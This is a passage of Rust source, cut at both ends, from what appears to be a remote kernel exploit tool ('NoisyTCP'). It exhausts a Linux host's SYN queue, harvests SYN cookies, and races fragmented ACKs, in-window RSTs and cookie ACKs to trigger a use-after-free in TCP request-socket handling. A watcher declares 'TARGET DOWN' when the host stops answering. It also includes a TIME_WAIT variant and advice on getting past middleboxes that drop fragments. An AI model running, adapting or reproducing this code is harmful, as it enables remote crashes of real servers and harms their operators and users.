                random_state: seed | 1,
                junk: VecDeque::new(),
                previous: Vec::new(),
                synack_timeout: Duration::from_millis(100),
                calibrated_fill: 0,
                resolved_split,
                stats: Stats::default(),
            }
        }

        fn random_u32(&mut self) -> u32 {
            let mut value = self.random_state;
            value ^= value >> 12;
            value ^= value << 25;
            value ^= value >> 27;
            self.random_state = value;
            (value.wrapping_mul(0x2545_f491_4f6c_dd1d) >> 32) as u32
        }

        fn random_range(&mut self, limit: u64) -> u64 {
            if limit <= 1 {
                0
            } else {
                u64::from(self.random_u32()) % limit
            }
        }

        fn take_source_port(&mut self) -> u16 {
            if self.next_source_port >= self.config.source_port_count {
                self.next_source_port = 0;
            }
            let port = usize::from(self.config.source_port) + self.next_source_port;
            self.next_source_port += 1;
            port as u16
        }

        fn next_packet_id(&mut self) -> u16 {
            self.packet_id = self.packet_id.wrapping_add(1);
            self.packet_id
        }

        fn transmit(&mut self, packet: &[u8]) -> bool {
            match self.sender.send(packet, self.config.target) {
                Ok(()) => {
                    self.stats.packets += 1;
                    true
                }
                Err(error) => {
                    self.stats.send_errors += 1;
                    if self.config.debug && self.stats.send_errors <= 8 {
                        eprintln!("[dbg] sendto: {error}");
                    }
                    false
                }
            }
        }

        fn transmit_batch(&mut self, packets: &[Vec<u8>]) {
            let (sent, failed) = self.sender.send_batch(packets, self.config.target);
            self.stats.packets += sent as u64;
            self.stats.send_errors += failed as u64;
            if failed > 0 && self.config.debug {
                eprintln!("[dbg] sendmmsg: {failed} packets not sent");
            }
        }

        fn build_segment(
            &self,
            port: u16,
            sequence: u32,
            acknowledgment: u32,
            flags: u8,
            mss: u16,
            payload_len: usize,
        ) -> Vec<u8> {
            tcp_packet(
                self.source,
                self.config.target,
                self.config.port,
                SegmentSpec {
                    source_port: port,
                    sequence,
                    acknowledgment,
                    flags,
                    mss,
                    payload_len,
                },
            )
        }

        fn send_segment(
            &mut self,
            port: u16,
            sequence: u32,
            acknowledgment: u32,
            flags: u8,
            mss: bool,
            payload_len: usize,
        ) -> bool {
            let tcp = self.build_segment(
                port,
                sequence,
                acknowledgment,
                flags,
                if mss { self.config.mss } else { 0 },
                payload_len,
            );
            let id = self.next_packet_id();
            let packet = ipv4_packet(self.source, self.config.target, id, 0, false, &tcp);
            self.transmit(&packet)
        }

        #[allow(clippy::too_many_arguments)]
        fn send_fragment(
            &mut self,
            port: u16,
            sequence: u32,
            acknowledgment: u32,
            flags: u8,
            payload_len: usize,
            packet_id: u16,
            first: bool,
            split: usize,
        ) -> bool {
            let tcp = self.build_segment(port, sequence, acknowledgment, flags, 0, payload_len);
            let packet = if first {
                ipv4_packet(
                    self.source,
                    self.config.target,
                    packet_id,
                    0,
                    true,
                    &tcp[..split],
                )
            } else {
                ipv4_packet(
                    self.source,
                    self.config.target,
                    packet_id,
                    split,
                    false,
                    &tcp[split..],
                )
            };
            self.transmit(&packet)
        }

        fn wait_synack(
            &mut self,
            port: u16,
            sent_sequence: u32,
            mut mark: u64,
            timeout: Duration,
        ) -> Option<u32> {
            if self.sniffer.dry {
                self.stats.timeouts += 1;
                return None;
            }
            let deadline = Instant::now() + timeout;
            loop {
                let (count, segment) = self.sniffer.state.read(port);
                if count != mark {
                    mark = count;
                    if segment.flags & (FLAG_SYN | FLAG_ACK) == FLAG_SYN | FLAG_ACK
                        && segment.acknowledgment == sent_sequence.wrapping_add(1)
                    {
                        return Some(segment.sequence);
                    }
                }
                if Instant::now() >= deadline || STOP.load(Ordering::Acquire) {
                    self.stats.timeouts += 1;
                    return None;
                }
                thread::sleep(Duration::from_micros(50));
            }
        }

        fn wait_segment(&mut self, port: u16, mark: u64, timeout: Duration) -> Option<Segment> {
            if self.sniffer.dry {
                self.stats.timeouts += 1;
                return None;
            }
            let deadline = Instant::now() + timeout;
            loop {
                let (count, segment) = self.sniffer.state.read(port);
                if count != mark {
                    return Some(segment);
                }
                if Instant::now() >= deadline || STOP.load(Ordering::Acquire) {
                    self.stats.timeouts += 1;
                    return None;
                }
                thread::sleep(Duration::from_micros(50));
            }
        }

        fn probe_request(
            &mut self,
            timeout: Duration,
            watch_rst: bool,
        ) -> io::Result<Option<(u32, Duration, bool)>> {
            let port = self.take_source_port();
            let sequence = self.random_u32();
            if watch_rst {
                self.sniffer.state.rst_seen.store(false, Ordering::Release);
                self.sniffer.state.watch_port.store(port, Ordering::Release);
            }
            let mark = self.sniffer.state.mark(port);
            let started = Instant::now();
            if !self.send_segment(port, sequence, 0, FLAG_SYN, true, 0) {
                if watch_rst {
                    self.sniffer.state.watch_port.store(0, Ordering::Release);
                }
                return Err(io::Error::last_os_error());
            }
            let response = self.wait_synack(port, sequence, mark, timeout);
            let rtt = started.elapsed();
            if watch_rst && response.is_some() {
                thread::sleep(Duration::from_millis(100));
            }
            let leaked = watch_rst && self.sniffer.state.rst_seen.load(Ordering::Acquire);
            if watch_rst {
                self.sniffer.state.watch_port.store(0, Ordering::Release);
            }
            self.send_segment(port, sequence.wrapping_add(1), 0, FLAG_RST, false, 0);
            Ok(response.map(|server_sequence| (server_sequence, rtt, leaked)))
        }

        /*
         * One fragmented SYN at a given split point. The probe segment carries
         * an MSS option plus `payload_len` bytes so every split in PROBE_SPLITS
         * is representable; a configured split beyond that segment gets a
         * dedicated, larger probe. Returns the server ISN on success.
         */
        fn probe_fragment_at(&mut self, split: usize, payload_len: usize) -> Option<u32> {
            let port = self.take_source_port();
            let sequence = self.random_u32();
            let packet_id = self.next_packet_id();
            let mark = self.sniffer.state.mark(port);
            let tcp = self.build_segment(port, sequence, 0, FLAG_SYN, self.config.mss, payload_len);
            let first = ipv4_packet(
                self.source,
                self.config.target,
                packet_id,
                0,
                true,
                &tcp[..split],
            );
            let second = ipv4_packet(
                self.source,
                self.config.target,
                packet_id,
                split,
                false,
                &tcp[split..],
            );
            self.transmit(&first);
            self.spin_gap(self.config.frag_gap_us);
            self.transmit(&second);
            let response = self.wait_synack(port, sequence, mark, Duration::from_secs(2));
            // A SYN consumes exactly one sequence number even when it carries
            // data (Linux discards data in a plain SYN), so rcv_nxt is the SYN
            // sequence plus one.  An RST anywhere else in the receive window
            // also drops the request, but matching rcv_nxt is the defined
            // embryonic-reset path and survives stricter RST sequence checks.
            self.send_segment(port, sequence.wrapping_add(1), 0, FLAG_RST, false, 0);
            response
        }

        /*
         * Fragment-path probe (from nsvk13): report which first-fragment split
         * points the path actually delivers, then resolve the split used by
         * the race. 8-byte first fragments are dropped by L4-inspecting
         * middleboxes ("tiny fragments"); 24 carries the whole TCP header.
         */
        fn fragment_path_probe(&mut self) -> io::Result<()> {
            let mut working: Vec<usize> = Vec::new();
            let mut report = String::new();
            for split in PROBE_SPLITS {
                let ok = self.probe_fragment_at(split, PROBE_PAYLOAD_LEN).is_some();
                report.push_str(&format!(" split{split}={}", if ok { "ok" } else { "drop" }));
                if ok {
                    working.push(split);
                }
            }
            println!("[*] fragment path:{report}");
            if working.is_empty() {
                if self.config.assume_ok {
                    println!(
                        "[!] no fragmented SYN got through; continuing because --assume-ok was supplied (the race needs fragments)"
                    );
                    return Ok(());
                }
                return Err(io::Error::other(
                    "the path drops or reassembles IPv4 fragments; the race cannot split RX contexts from this position — move the sender into the target's L3 domain or tunnel past the fragment-eating hop",
                ));
            }
            let segment_len = 20 + self.config.payload;
            let usable: Vec<usize> = working
                .iter()
                .copied()
                .filter(|split| *split < segment_len)
                .collect();
            if let Some(requested) = self.config.frag_split {
                if !working.contains(&requested) {
                    // The fixed probe only carries PROBE_PAYLOAD_LEN bytes.  A
                    // larger requested split needs a larger SYN to be
                    // representable; probe it directly instead of falsely
                    // reporting that the path drops it.
                    let header = if self.config.mss != 0 { 24 } else { 20 };
                    let probe_payload = requested
                        .saturating_sub(header)
                        .saturating_add(8)
                        .max(PROBE_PAYLOAD_LEN);
                    if self.probe_fragment_at(requested, probe_payload).is_some() {
                        println!(
                            "[*] configured --frag-split {requested} verified with a {probe_payload}-byte probe"
                        );
                    } else {
                        return Err(io::Error::other(format!(
                            "the configured --frag-split {requested} is dropped by the path; working splits: {working:?}"
                        )));
                    }
                }
                self.resolved_split = requested;
            } else {
                let preferred = [24usize, 32, 40, 8]
                    .into_iter()
                    .find(|split| usable.contains(split))
                    .or_else(|| usable.first().copied());
                match preferred {
                    Some(split) => {
                        self.resolved_split = split;
                        println!("[*] using --frag-split {split} (first fragment carries {split} TCP bytes)");
                    }
                    None => {
                        return Err(io::Error::other(format!(
                            "working splits {working:?} do not fit the {}-byte reader segment; raise --payload",
                            segment_len
                        )));
                    }
                }
            }
            Ok(())
        }

        fn leak_check(&mut self) -> io::Result<()> {
            let result = self.probe_request(Duration::from_secs(2), true)?;
            let leaked = result.map(|(_, _, leaked)| leaked).unwrap_or(false);
            if leaked {
                self.stats.rst_leaks += 1;
            }
            if leaked && !self.config.assume_ok {
                let last_port =
                    usize::from(self.config.source_port) + self.config.source_port_count - 1;
                return Err(io::Error::other(format!(
                    "the local kernel answered SYN-ACK with RST; suppress it with: iptables -I OUTPUT -p tcp --sport {}:{last_port} --tcp-flags RST RST -m mark ! --mark 0x{:x} -j DROP (or let the automatic filter install it, or use --spoof on an on-link segment)",
                    self.config.source_port, self.config.mark
                )));
            }
            if leaked {
                println!("[!] host RST leak ignored because --assume-ok was supplied");
            } else {
                println!("[+] no host-generated RST detected");
            }
            Ok(())
        }

        fn auto_tune_timeout(&mut self) -> io::Result<()> {
            if let Some(milliseconds) = self.config.synack_ms {
                self.synack_timeout = Duration::from_millis(milliseconds);
                return Ok(());
            }
            let response = self.probe_request(Duration::from_secs(2), false)?;
            let Some((_, rtt, _)) = response else {
                return Err(io::Error::new(
                    io::ErrorKind::TimedOut,
                    format!(
                        "no valid SYN-ACK from {}:{} within 2 seconds",
                        self.config.target, self.config.port
                    ),
                ));
            };
            let milliseconds = (rtt.as_millis() as u64)
                .saturating_mul(4)
                .saturating_add(10)
                .clamp(10, 2_000);
            self.synack_timeout = Duration::from_millis(milliseconds);
            // A slow path needs a longer settle between control phases.  Only
            // auto-tune when the value is still the built-in default, so an
            // explicit (hidden QA) --settle-us always wins.
            if self.config.settle_us == 5_000 {
                let rtt_us = rtt.as_micros().min(u128::from(u64::MAX)) as u64;
                self.config.settle_us = rtt_us.saturating_mul(20).clamp(5_000, 50_000);
            }
            println!(
                "[*] RTT={:.3} ms, SYN-ACK timeout={milliseconds} ms, settle={} us",
                rtt.as_secs_f64() * 1000.0,
                self.config.settle_us
            );
            Ok(())
        }

        fn junk_fill(&mut self, count: usize) {
            let mut packets = Vec::with_capacity(count.min(SENDMMSG_CHUNK));
            for _ in 0..count {
                let port = self.take_source_port();
                let sequence = self.random_u32();
                let tcp = self.build_segment(port, sequence, 0, FLAG_SYN, self.config.mss, 0);
                let id = self.next_packet_id();
                packets.push(ipv4_packet(
                    self.source,
                    self.config.target,
                    id,
                    0,
                    false,
                    &tcp,
                ));
                self.junk.push_back(JunkRequest { port, sequence });
                if packets.len() == SENDMMSG_CHUNK {
                    self.transmit_batch(&packets);
                    packets.clear();
                }
            }
            if !packets.is_empty() {
                self.transmit_batch(&packets);
            }
        }

        fn junk_drain(&mut self, count: usize) {
            let mut packets = Vec::with_capacity(count.min(SENDMMSG_CHUNK));
            for _ in 0..count {
                let Some(request) = self.junk.pop_front() else {
                    break;
                };
                let tcp = self.build_segment(
                    request.port,
                    request.sequence.wrapping_add(1),
                    0,
                    FLAG_RST,
                    0,
                    0,
                );
                let id = self.next_packet_id();
                packets.push(ipv4_packet(
                    self.source,
                    self.config.target,
                    id,
                    0,
                    false,
                    &tcp,
                ));
                if packets.len() == SENDMMSG_CHUNK {
                    self.transmit_batch(&packets);
                    packets.clear();
                }
            }
            if !packets.is_empty() {
                self.transmit_batch(&packets);
            }
        }

        fn junk_drain_all(&mut self) {
            self.junk_drain(self.junk.len());
        }

        fn settle(&self) {
            if self.config.settle_us > 0 {
                thread::sleep(Duration::from_micros(self.config.settle_us));
            }
        }

        fn settle_drain(&self) {
            if self.config.drain_settle_us > 0 {
                thread::sleep(Duration::from_micros(self.config.drain_settle_us));
            }
        }

        fn run_deadline(started: Instant, seconds: u64) -> io::Result<Option<Instant>> {
            if seconds == 0 {
                return Ok(None);
            }
            started
                .checked_add(Duration::from_secs(seconds))
                .map(Some)
                .ok_or_else(|| invalid_input("--duration is too large"))
        }

        fn spin_gap(&mut self, base: u64) {
            let delay = base + self.random_range(self.config.jitter_us + 1);
            if delay == 0 {
                return;
            }
            let started = Instant::now();
            while started.elapsed() < Duration::from_micros(delay) {
                std::hint::spin_loop();
            }
        }

        fn probe_tuple(&mut self, port: u16, request_sequence: u32, cleanup: bool) -> i32 {
            let probe_sequence = request_sequence.wrapping_add(0x8000_0000);
            let mark = self.sniffer.state.mark(port);
            self.send_segment(port, probe_sequence, 0, FLAG_SYN, true, 0);
            let response = self.wait_segment(port, mark, self.synack_timeout);
            if cleanup {
                self.send_segment(port, probe_sequence.wrapping_add(1), 0, FLAG_RST, false, 0);
                self.send_segment(
                    port,
                    request_sequence.wrapping_add(1),
                    0,
                    FLAG_RST,
                    false,
                    0,
                );
            }
            match response {
                Some(segment) if segment.flags & FLAG_SYN != 0 => 0,
                Some(segment) if segment.flags & FLAG_ACK != 0 => 1,
                _ => -1,
            }
        }

        fn calibrate_fill(&mut self) -> io::Result<usize> {
            if let Some(backlog) = self.config.backlog {
                self.calibrated_fill = backlog;
                self.junk_fill(backlog);
                self.settle();
                println!("[*] using configured SYN backlog={backlog}");
                return Ok(backlog);
            }
            let maximum = MAX_BACKLOG.min(self.config.source_port_count / 4);
            let mut low = 1usize;
            let mut high = maximum;
            let mut saturated = false;
            for _ in 0..16 {
                if low >= high {
                    break;
                }
                let middle = low + (high - low) / 2;
                let mut result = -1;
                for attempt in 0..4 {
                    self.junk_drain_all();
                    self.settle();
                    self.junk_fill(middle);
                    let settling = self.config.settle_us * (1 + middle as u64 / 256);
                    thread::sleep(Duration::from_micros(settling));
                    let port = self.take_source_port();
                    let sequence = self.random_u32();
                    let mark = self.sniffer.state.mark(port);
                    self.send_segment(port, sequence, 0, FLAG_SYN, true, 0);
                    let timeout = self
                        .synack_timeout
                        .checked_mul(1 << attempt)
                        .unwrap_or(Duration::from_secs(4))
                        .min(Duration::from_secs(4));
                    if self.wait_synack(port, sequence, mark, timeout).is_none() {
                        continue;
                    }
                    self.settle();
                    result = self.probe_tuple(port, sequence, true);
                    if result >= 0 {
                        break;
                    }
                }
                if result < 0 {
                    self.junk_drain_all();
                    return Err(io::Error::new(
                        io::ErrorKind::TimedOut,
                        "SYN queue calibration failed: no usable probe response",
                    ));
                }
                if self.config.debug {
                    println!("[dbg] calibration fill={middle} request_present={result}");
                }
                if result == 1 {
                    low = middle + 1;
                } else {
                    saturated = true;
                    high = middle;
                }
            }
            self.junk_drain_all();
            if !saturated {
                return Err(io::Error::other(format!(
                    "SYN queue did not saturate up to {maximum}; SYN cookies may be disabled or the listener backlog is larger"
                )));
            }
            if low <= 1 {
                self.junk_drain_all();
                return Err(io::Error::other(
                    "the listener returns cookies immediately (tcp_syncookies=2)",
                ));
            }
            self.calibrated_fill = low;
            self.junk_fill(low);
            self.settle();
            println!("[+] SYN queue saturates at {low} pending requests");
            Ok(low)
        }

        fn cleanup_previous(&mut self) {
            let mut packets = Vec::new();
            for index in 0..self.previous.len() {
                let target = self.previous[index];
                if target.harvest_sequence != 0 {
                    let tcp = self.build_segment(
                        target.port,
                        target.harvest_sequence.wrapping_add(1),
                        0,
                        FLAG_RST,
                        0,
                        0,
                    );
                    let id = self.next_packet_id();
                    packets.push(ipv4_packet(
                        self.source,
                        self.config.target,
                        id,
                        0,
                        false,
                        &tcp,
                    ));
                }
                if target.request_sequence != 0 {
                    let tcp = self.build_segment(
                        target.port,
                        target.request_sequence.wrapping_add(1),
                        0,
                        FLAG_RST,
                        0,
                        0,
                    );
                    let id = self.next_packet_id();
                    packets.push(ipv4_packet(
                        self.source,
                        self.config.target,
                        id,
                        0,
                        false,
                        &tcp,
                    ));
                }
            }
            self.transmit_batch(&packets);
            self.previous.clear();
        }

        /*
         * The free/reallocate shot sequence, shared by race rounds and tw
         * mode. Per tuple: complete the fragmented lookup, let it race an
         * in-window RST (frees R) followed by the cookie ACK (reallocates the
         * slab slot as an unhashed, NULL-listener cookie request), then RST
         * the child unless --keep-children.
         */
        fn shoot(&mut self, targets: &mut [Target]) {
            let split = self.resolved_split;
            let payload = self.config.payload;
            let mut live = 0u64;
            for target in targets.iter_mut() {
                if target.cookie.is_none() {
                    continue;
                }
                target.packet_id = self.next_packet_id();
                if let Ok(path) = std::env::var("NOISYTCP_GDB_TUPLE") {
                    if std::fs::write(path, target.port.to_string()).is_err() {
                        eprintln!("NoisyTCP failed: cannot publish the GDB tuple");
                        STOP.store(true, Ordering::Release);
                        return;
                    }
                    thread::sleep(Duration::from_millis(50));
                }
                self.send_fragment(
                    target.port,
                    target.request_sequence.wrapping_add(1),
                    0,
                    FLAG_ACK,
                    payload,
                    target.packet_id,
                    true,
                    split,
                );
                live += 1;
            }
            if live == 0 {
                return;
            }
            self.spin_gap(self.config.frag_gap_us);
            for target in targets.iter() {
                let target = *target;
                let Some(cookie) = target.cookie else {
                    continue;
                };
                self.send_fragment(
                    target.port,
                    target.request_sequence.wrapping_add(1),
                    0,
                    FLAG_ACK,
                    payload,
                    target.packet_id,
                    false,
                    split,
                );
                for _ in 1..self.config.readers {
                    let packet_id = self.next_packet_id();
                    self.send_fragment(
                        target.port,
                        target.request_sequence.wrapping_add(1),
                        0,
                        FLAG_ACK,
                        payload,
                        packet_id,
                        true,
                        split,
                    );
                    self.send_fragment(
                        target.port,
                        target.request_sequence.wrapping_add(1),
                        0,
                        FLAG_ACK,
                        payload,
                        packet_id,
                        false,
                        split,
                    );
                }
                if let Ok(path) = std::env::var("NOISYTCP_GDB_SYNC") {
                    let path = std::path::Path::new(&path);
                    // GDB runs with TCG: leave enough time for the host window
                    // to drain filler lookups before the reader is resumed.
                    let deadline = Instant::now() + Duration::from_secs(30);
                    while !path.exists() && Instant::now() < deadline {
                        thread::sleep(Duration::from_micros(50));
                    }
                    if std::fs::remove_file(path).is_err() {
                        eprintln!("NoisyTCP failed: GDB synchronization timed out");
                        STOP.store(true, Ordering::Release);
                        return;
                    }
                }
                if let Ok(path) = std::env::var("NOISYTCP_GDB_TUPLE") {
                    let _ = std::fs::remove_file(path);
                }
                self.spin_gap(self.config.free_gap_us);
                self.send_segment(
                    target.port,
                    target.request_sequence.wrapping_add(1),
                    0,
                    FLAG_RST,
                    false,
                    0,
                );
                self.spin_gap(self.config.alloc_gap_us);
                self.send_segment(
                    target.port,
                    target.harvest_sequence.wrapping_add(1),
                    cookie.wrapping_add(1),
                    FLAG_ACK,
                    false,
                    0,
                );
                if !self.config.keep_children {
                    self.send_segment(
                        target.port,
                        target.harvest_sequence.wrapping_add(1),
                        0,
                        FLAG_RST,
                        false,
                        0,
                    );
                }
            }
            self.stats.attempts += live;
        }

        fn run_round(&mut self, batch: usize) {
            if let Ok(path) = std::env::var("NOISYTCP_GDB_TUPLE") {
                let _ = std::fs::remove_file(path);
            }
            self.cleanup_previous();
            self.junk_drain_all();
            self.settle();
            let fill = self.calibrated_fill;
            self.junk_fill(fill);
            self.settle();

            let mut targets = Vec::with_capacity(batch);
            let mut packets = Vec::with_capacity(batch.min(SENDMMSG_CHUNK));
            for _ in 0..batch {
                let port = self.take_source_port();
                let harvest_sequence = self.random_u32();
                let mark = self.sniffer.state.mark(port);
                let tcp =
                    self.build_segment(port, harvest_sequence, 0, FLAG_SYN, self.config.mss, 0);
                let id = self.next_packet_id();
                packets.push(ipv4_packet(
                    self.source,
                    self.config.target,
                    id,
                    0,
                    false,
                    &tcp,
                ));
                if packets.len() == SENDMMSG_CHUNK {
                    self.transmit_batch(&packets);
                    packets.clear();
                }
                targets.push(Target {
                    port,
                    harvest_sequence,
                    mark,
                    ..Target::default()
                });
            }
            if !packets.is_empty() {
                self.transmit_batch(&packets);
            }
            let deadline = Instant::now() + self.synack_timeout;
            loop {
                let mut received = 0usize;
                for target in &mut targets {
                    if target.cookie.is_some() {
                        received += 1;
                        continue;
                    }
                    let (count, segment) = self.sniffer.state.read(target.port);
                    if count == target.mark {
                        continue;
                    }
                    target.mark = count;
                    if segment.flags & (FLAG_SYN | FLAG_ACK) == FLAG_SYN | FLAG_ACK
                        && segment.acknowledgment == target.harvest_sequence.wrapping_add(1)
                    {
                        target.cookie = Some(segment.sequence);
                        received += 1;
                    }
                }
                if received == batch
                    || self.sniffer.dry
                    || Instant::now() >= deadline
                    || STOP.load(Ordering::Acquire)
                {
                    self.stats.cookies += received as u64;
                    break;
                }
                thread::sleep(Duration::from_micros(50));
            }

            self.junk_drain_all();
            self.settle_drain();
            let mut packets = Vec::new();
            for target in &mut targets {
                if target.cookie.is_none() {
                    continue;
                }
                target.request_sequence = self.random_u32();
                let tcp = self.build_segment(
                    target.port,
                    target.request_sequence,
                    0,
                    FLAG_SYN,
                    self.config.mss,
                    0,
                );
                let id = self.next_packet_id();
                packets.push(ipv4_packet(
                    self.source,
                    self.config.target,
                    id,
                    0,
                    false,
                    &tcp,
                ));
                if packets.len() == SENDMMSG_CHUNK {
                    self.transmit_batch(&packets);
                    packets.clear();
                }
            }
            if !packets.is_empty() {
                self.transmit_batch(&packets);
            }
            self.settle();

            self.shoot(&mut targets);
            self.previous = targets;
            self.stats.rounds += 1;
        }

        fn mode_probe(&mut self) -> io::Result<()> {
            let response = self.probe_request(Duration::from_secs(2), true)?;
            let Some((server_sequence, rtt, leaked)) = response else {
                return Err(io::Error::new(
                    io::ErrorKind::TimedOut,
                    "no valid SYN-ACK; check the listener, route and packet filter",
                ));
            };
            println!(
                "[+] SYN-ACK received: server_isn=0x{server_sequence:08x} rtt={:.3} ms",
                rtt.as_secs_f64() * 1000.0
            );
            if leaked && !self.config.assume_ok {
                return Err(io::Error::other(
                    "the local kernel leaked an in-window RST; the automatic filter did not suppress it",
                ));
            }
            if leaked {
                self.stats.rst_leaks += 1;
                println!("[!] host-generated RST detected and ignored (--assume-ok)");
            } else {
                println!("[+] no host-generated RST detected");
            }
            self.fragment_path_probe()
        }

        fn mode_verify(&mut self) -> io::Result<()> {
            self.leak_check()?;
            self.auto_tune_timeout()?;
            println!("[1/5] calibrating and saturating the SYN queue");
            self.calibrate_fill()?;

            println!("[2/5] harvesting a SYN cookie");
            let port = self.take_source_port();
            let harvest_sequence = self.random_u32();
            let mark = self.sniffer.state.mark(port);
            self.send_segment(port, harvest_sequence, 0, FLAG_SYN, true, 0);
            let cookie = self
                .wait_synack(port, harvest_sequence, mark, self.synack_timeout)
                .ok_or_else(|| {
                    io::Error::new(io::ErrorKind::TimedOut, "no SYN-ACK for cookie harvest")
                })?;
            println!("      cookie=0x{cookie:08x}");

            println!("[3/5] freeing one queue slot and creating a hashed request socket");
            self.junk_drain(1);
            self.settle_drain();
            let request_sequence = self.random_u32();
            let mark = self.sniffer.state.mark(port);
            self.send_segment(port, request_sequence, 0, FLAG_SYN, true, 0);
            let request_isn = self
                .wait_synack(port, request_sequence, mark, self.synack_timeout)
                .ok_or_else(|| {
                    io::Error::new(
                        io::ErrorKind::TimedOut,
                        "no SYN-ACK while creating the request socket",
                    )
                })?;
            println!("      request server_isn=0x{request_isn:08x}");

            println!("[4/5] checking the established hash lookup");
            let request_present = self.probe_tuple(port, request_sequence, false);
            match request_present {
                1 => println!("      request socket is hashed (challenge ACK received)"),
                0 => {
                    self.junk_drain_all();
                    return Err(io::Error::other(
                        "request socket is absent: the tuple took the cookie path again",
                    ));
                }
                _ => {
                    self.junk_drain_all();
                    return Err(io::Error::new(
                        io::ErrorKind::TimedOut,
                        "no response to the request-socket challenge probe",
                    ));
                }
            }

            println!("[5/5] sending RST followed by the cookie ACK");
            self.send_segment(
                port,
                request_sequence.wrapping_add(1),
                0,
                FLAG_RST,
                false,
                0,
            );
            self.spin_gap(self.config.alloc_gap_us);
            self.send_segment(
                port,
                harvest_sequence.wrapping_add(1),
                cookie.wrapping_add(1),
                FLAG_ACK,
                false,
                0,
            );
            if !self.config.keep_children {
                self.send_segment(
                    port,
                    harvest_sequence.wrapping_add(1),
                    0,
                    FLAG_RST,
                    false,
                    0,
                );
            }
            thread::sleep(Duration::from_millis(100));
            self.junk_drain_all();
            self.stats.synacks = self.sniffer.state.synacks.load(Ordering::Relaxed);
            println!(
                "[+] verify complete; check SyncookiesRecv and EmbryonicRsts on the target (packets={} send_errors={} synacks={})",
                self.stats.packets, self.stats.send_errors, self.stats.synacks
            );
            Ok(())
        }

        fn report_stats(&mut self, started: Instant) {
            self.stats.synacks = self.sniffer.state.synacks.load(Ordering::Relaxed);
            let elapsed = started.elapsed().as_secs_f64();
            println!(
                "[{:6.1}s] rounds={} attempts={} ({:.0}/s) cookies={} synacks={} packets={} timeouts={} send_errors={} rst_leaks={}",
                elapsed,
                self.stats.rounds,
                self.stats.attempts,
                self.stats.attempts as f64 / elapsed.max(0.001),
                self.stats.cookies,
                self.stats.synacks,
                self.stats.packets,
                self.stats.timeouts,
                self.stats.send_errors,
                self.stats.rst_leaks
            );
        }

        fn mode_race(&mut self) -> io::Result<()> {
            println!("[preflight 1/2] checking packets, fragmentation and host RSTs");
            self.mode_probe()?;
            println!("[preflight 2/2] checking SYN cookies and request sockets");
            self.mode_verify()?;
            println!("[+] preflight passed; starting the race");
            if let Ok(path) = std::env::var("NOISYTCP_GDB_READY") {
                let path = std::path::Path::new(&path);
                let deadline = Instant::now() + Duration::from_secs(60);
                while !path.exists() && Instant::now() < deadline {
                    thread::sleep(Duration::from_micros(50));
                }
                if std::fs::remove_file(path).is_err() {
                    return Err(io::Error::new(
                        io::ErrorKind::TimedOut,
                        "GDB initialization timed out",
                    ));
                }
            }
            let fill = self.calibrated_fill;
            let batch = if self.config.batch == 0 {
                fill.clamp(1, MAX_BATCH)
            } else {
                self.config.batch
            };
            println!(
                "[*] race batch={batch} readers={} fill={fill} split={} payload={} gaps={}/{}/{} us jitter={} us",
                self.config.readers,
                self.resolved_split,
                self.config.payload,
                self.config.frag_gap_us,
                self.config.free_gap_us,
                self.config.alloc_gap_us,
                self.config.jitter_us
            );
            if !self.config.no_watch {
                self.watch = Some(Watcher::start(&self.config, self.watch_source));
                println!("[*] liveness watcher active: 4 failed connects (~10 s) declare TARGET DOWN and stop (exit code 3)");
            }
            println!("Ctrl+C to stop; only a target kernel log can confirm the panic");
            let started = Instant::now();
            let deadline = Self::run_deadline(started, self.config.duration)?;
            let mut next_report = started + Duration::from_secs(5);
            while !STOP.load(Ordering::Acquire) {
                if deadline.is_some_and(|deadline| Instant::now() >= deadline) {
                    break;
                }
                self.run_round(batch);
                if Instant::now() >= next_report {
                    self.report_stats(started);
                    next_report = Instant::now() + Duration::from_secs(5);
                }
            }
            self.junk_drain_all();
            self.cleanup_previous();
            self.report_stats(started);
            if self.stats.cookies == 0 {
                println!("[!] no cookies were harvested; no race attempt was possible");
            }
            if TARGET_DOWN.load(Ordering::Acquire) {
                println!("[+] stopped: TARGET DOWN reported by the liveness watcher");
            }
            Ok(())
        }

        /*
         * TIME_WAIT mode (ported from re4): for targets with
         * net.ipv4.tcp_syncookies=2 no SYN ever creates a hashed request
         * socket, so the normal race has nothing to free. Drive the tuple
         * through a full handshake and close into TIME_WAIT, then recycle it
         * with a SYN whose ISN is past tw_rcv_nxt: tcp_timewait_state_process()
         * returns TCP_TW_SYN and tcp_conn_request() skips the syncookie block
         * (tcp_tw_isn is set), creating a hashed request socket R. The saved
         * cookie from the first SYN-ACK then drives the same free/realloc shot.
         * Requires a listener that accepts and closes immediately.
         */
        fn tw_attempt(&mut self) -> bool {
            let port = self.take_source_port();
            let s1 = self.random_u32();
            let mut s2 = 0u32;
            match self.tw_handshake(port, s1, &mut s2) {
                Some(cookie) => {
                    let mut target = Target {
                        port,
                        harvest_sequence: s1,
                        request_sequence: s2,
                        cookie: Some(cookie),
                        mark: 0,
                        packet_id: 0,
                    };
                    self.shoot(std::slice::from_mut(&mut target));
                    self.stats.rounds += 1;
                    true
                }
                None => {
                    // A half-open request or an established child would
                    // linger for seconds and pollute later attempts, so tear
                    // the tuple down on every failed stage.
                    self.abort_tuple(port, s1, (s2 != 0).then_some(s2));
                    false
                }
            }
        }

        /*
         * Walk one tuple through a full handshake, close it into TIME_WAIT
         * and recycle it into a hashed request socket. Returns the cookie
         * harvested from the first SYN-ACK and stores the recycling ISN.
         */
        fn tw_handshake(&mut self, port: u16, s1: u32, s2: &mut u32) -> Option<u32> {
            let mark = self.sniffer.state.mark(port);
            if !self.send_segment(port, s1, 0, FLAG_SYN, true, 0) {
                return None;
            }
            let cookie = self.wait_synack(port, s1, mark, self.synack_timeout)?;

            // complete the handshake; the listener accepts and closes
            let mark = self.sniffer.state.mark(port);
            self.send_segment(
                port,
                s1.wrapping_add(1),
                cookie.wrapping_add(1),
                FLAG_ACK,
                false,
                0,
            );
            let fin = self.wait_segment(port, mark, Duration::from_millis(300))?;
            if fin.flags & FLAG_FIN == 0 {
                return None;
            }
            let fseq = fin.sequence;
            let fack = fin.acknowledgment;

            // ACK and FIN must be separate segments; a combined one takes
            // the "bad case" branch in tcp_fin() and defers TIME_WAIT
            let mark = self.sniffer.state.mark(port);
            self.send_segment(port, fack, fseq.wrapping_add(1), FLAG_ACK, false, 0);
            thread::sleep(Duration::from_micros(200));
            self.send_segment(
                port,
                fack,
                fseq.wrapping_add(1),
                FLAG_FIN | FLAG_ACK,
                false,
                0,
            );
            let ack = self.wait_segment(port, mark, Duration::from_millis(300))?;
            if ack.flags & FLAG_ACK == 0
                || ack.acknowledgment != fack.wrapping_add(1)
                || ack.sequence != fseq.wrapping_add(1)
            {
                return None;
            }

